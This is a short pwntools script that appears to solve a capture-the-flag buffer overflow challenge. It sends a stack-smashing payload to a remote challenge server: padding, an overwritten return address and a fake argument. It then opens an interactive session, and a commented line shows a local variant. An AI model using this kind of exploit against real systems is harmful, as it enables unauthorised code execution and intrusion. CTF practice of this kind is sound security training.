from pwn import *

#(cat /tmp/inp;cat) | ./bof 
#python -c "print('A'*0x4c + \x77\x92\x04\x08' + 'junk' + \xef\xbe\xad\xde')" > /tmp/inp


#sh = process('./bof')
sh = remote('challenges.traboda.com', 8016)

payload = b'A'*0x4c + p32(0x08049277) + b'junk' + p32(0xdeadbeef)

sh.sendlineafter(': ', payload)

sh.interactive()

